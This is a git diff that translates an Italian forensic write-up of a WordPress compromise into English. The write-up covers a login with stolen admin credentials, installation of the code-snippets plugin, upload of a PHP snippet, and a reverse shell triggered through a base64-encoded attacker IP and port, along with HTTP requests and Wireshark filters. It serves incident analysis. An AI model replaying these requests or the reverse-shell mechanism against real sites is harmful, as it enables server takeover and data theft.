@@ -1,28 +1,27 @@
-
 # CVE-2024-7420 (58.16.78.90 -> 192.168.100.101)
 
-Flussi TCP confermano un’azione potenzialmente malevola da parte di un attore che dispone di privilegi admin, che ha installato il plugin **code-snippets**. Sono state fatte ulteriori analisi per veriicahe sfruttamneti a vulnerabilità note.
+TCP flows confirm a potentially malicious action by an actor with admin privileges who installed the **code-snippets** plugin. Further analysis was conducted to verify exploitation of known vulnerabilities.
 
 ## When
 
-| **Evento**                     | **Timestamp** | **TCP Stream** | **Dettagli**                                   |
+| **Event**                     | **Timestamp** | **TCP Stream** | **Details**                                   |
 |--------------------------------|---------------|----------------|-----------------------------------------------|
-| Login admin            | 22:45:15.45   | 458            | POST a /wp-login.php con admin:byebye         |
-| Installazione plugin           | 22:45:15.80   | 461            | Navigazione e installazione code-snippets     |
-| Upload  snippet malevolo  | 22:46:21.03   | 621            | POST con file fancy_rnd.json                  |
-| Attivazione  shell remota | 22:47:09.60   | 730            | GET con rand=NTguMTYuNzguOTAvNDQz             |
+| Admin login                   | 22:45:15.45   | 458            | POST to /wp-login.php with admin:byebye       |
+| Plugin installation           | 22:45:15.80   | 461            | Navigation and installation of code-snippets  |
+| Malicious snippet upload      | 22:46:21.03   | 621            | POST with file fancy_rnd.json                 |
+| Remote shell activation       | 22:47:09.60   | 730            | GET with rand=NTguMTYuNzguOTAvNDQz            |
 
 ## Who/Where
 
-| **Ruolo**         | **Indirizzo IP**       | **Porta**       |
-|--------------------|------------------------|-----------------|
-| Attaccante         | 58.16.78.90           | 51144, 51176, 54012, 44250 |
-| Server compromesso | 192.168.100.101       | 80 (srv-www)    |
-| Destinazione  reverse shell |  58.16.78.90         | 443             |
+| **Role**         | **IP Address**         | **Port**        |
+|-------------------|------------------------|-----------------|
+| Attacker          | 58.16.78.90           | 51144, 51176, 54012, 44250 |
+| Compromised server| 192.168.100.101       | 80 (srv-www)    |
+| Reverse shell destination | 58.16.78.90    | 443             |
 
 ## What
 
-1. L’attaccante ha effettuato l’accesso con le stesse credenziali (admin:byebye) rubate nella fase precedente
+1. The attacker logged in using the same credentials (admin:byebye) stolen in the previous db attack.
 
 ```sh
     POST /wp-login.php
@@ -30,18 +29,19 @@ Flussi TCP confermano un’azione potenzialmente malevola da parte di un attore 
     log=admin&pwd=byebye
 ```
 
-2. Accesso e installazione del plugin attraverso la dashboard WordPress
+2. Access and installation of the plugin through the WordPress dashboard.
 
 ```sh
     GET /wp-admin/plugins.php
     GET /wp-admin/plugin-install.php
     POST /wp-admin/admin-ajax.php HTTP/1.1
-    slug=code-snippets&action=install-plugin&_ajax_nonce=aad5c50a4b&_fs_nonce=&username=&password=&connection_type=&public_key=&private_key=
+    slug=code-snippets&action=install-plugin&_ajax_nonce=aad5c50a4b&_fs_nonce=&username=&password=
+    &connection_type=&public_key=&private_key=
 ```
 
-3. Caricamento dello snippet PHP malevolo
+3. Upload of the malicious PHP snippet.
 
-    - Lo snippet contiene codice per l’invocazione di una reverse shell su base64-decoded IP/porta.
+    - The snippet contains code to invoke a reverse shell using a base64-decoded IP/port.
 
     ```php
     add_action('init', function() {
@@ -51,7 +51,7 @@ Flussi TCP confermano un’azione potenzialmente malevola da parte di un attore 
     });
     ```
 
-4. Attivazione della shell
+4. Shell activation.
 
 ```sh
     GET /?rand=NTguMTYuNzguOTAvNDQz
@@ -59,22 +59,20 @@ Flussi TCP confermano un’azione potenzialmente malevola da parte di un attore 
 
  - echo "NTguMTYuNzguOTAvNDQz" | base64 -d 
  - 58.16.78.90/443
- - Il server WordPress avvia una connessione in uscita verso 58.16.78.90:443, stabilendo una shell Bash interattiva.
-
+ - The WordPress server initiates an outbound connection to 58.16.78.90:443, establishing an interactive Bash shell.
 
 ## How
 
-- L’attaccante ha sfruttato le credenziali admin modificate nel precedente attacco.
-- È stata utilizzata la vulnerabilità  [CVE-2024-7420](https://nvd.nist.gov/vuln/detail/CVE-2024-7420)
+- The attacker exploited the admin credentials modified in the previous attack.
+- The vulnerability [CVE-2024-7420](https://nvd.nist.gov/vuln/detail/CVE-2024-7420) was used.
 
 ## Why
 
-- Ottenere pieno controllo sul server web
-- Esfiltrare dati sensibili aziendali
-- Possibile installazione di backdoor persistenti
+- Gain full control over the web server.
+- Exfiltrate sensitive corporate data.
+- Potential installation of persistent backdoors.
 
-
-**Filtri Wireshark utilizzati**
+**Wireshark filters used**
 
 ```sh
 http.request.method == "POST" && http contains "login"
